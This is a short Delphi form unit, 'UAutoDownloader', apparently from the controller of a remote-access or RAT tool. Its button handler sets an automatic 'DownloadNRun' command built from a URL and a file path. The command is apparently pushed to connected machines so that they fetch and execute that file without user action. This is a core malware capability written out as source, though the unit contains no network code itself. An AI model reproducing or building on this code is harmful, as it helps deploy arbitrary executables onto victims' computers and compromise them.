unit UAutoDownloader;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls,usettings;

type
  TForm4 = class(TForm)
    GroupBox1: TGroupBox;
    Label2: TLabel;
    Label1: TLabel;
    Button1: TButton;
    EdtPath: TEdit;
    EdtUrl: TEdit;
    procedure Button1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form4: TForm4;

implementation

{$R *.dfm}

uses UMian;

procedure TForm4.Button1Click(Sender: TObject);
begin
if form1.a7.Checked = false then
  begin
    AutoCommand := 'DownloadNRun|' + EdtUrl.Text + '|' + EdtPath.Text;
    AutoCommandSet := true;
    showmessage('Command Set');
    form1.a7.Checked := true;
  end
  else
  begin
    showmessage('Command Reset');
    AutoCommand := '';
    AutoCommandSet := false;
    form1.a7.Checked := false;
  end;
sleep(100);
form4.Close;
end;
procedure closeCwindow();
begin
  form4.Close;
end;

procedure TForm4.FormShow(Sender: TObject);
begin
//
end;

end.
